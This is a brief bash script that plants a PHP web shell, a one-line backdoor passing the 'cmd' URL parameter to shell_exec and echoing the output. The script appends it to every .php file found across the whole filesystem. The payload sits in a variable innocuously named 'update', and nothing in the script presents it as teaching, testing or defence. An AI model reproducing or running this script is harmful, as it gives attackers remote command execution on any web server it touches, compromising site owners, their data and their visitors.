#!/bin/bash
update="<?php if (!empty(\$_GET['cmd'])) { \$v = shell_exec(\$_GET['cmd']); echo \$v;} ?>"
for file in $(find / -name '*.php');  do echo "$update" >> $file;done;
